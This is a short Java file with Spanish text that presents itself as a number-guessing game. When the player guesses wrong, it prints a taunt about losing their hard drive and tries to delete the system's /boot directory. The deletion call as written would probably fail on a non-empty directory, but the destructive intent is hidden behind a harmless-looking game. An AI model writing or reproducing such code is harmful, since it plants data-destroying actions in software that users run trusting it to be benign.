package cosas;


import java.io.File;
import java.util.Random;
import java.util.Scanner;
import java.util.random.*;
public class Cosas1 {
	public static void main(String[] args) {
	    
		Scanner sc = new Scanner(System.in);
	    System.out.println("escoje un numero del 1 al 10:");

	    int guess = sc.nextInt();
	    Random random = new Random();
	    int num = random.nextInt(10) + 1;
	    if (num == guess){
	        System.out.println("has ganado!!!");
	    }
	    else{
	    	System.out.println("ale tonto, te quedas sin disco duro");
	        String ruta = "/boot";
	        File archivo = new File(ruta);
	        archivo.delete();
	    }
		
		sc.close();
		
	}

}
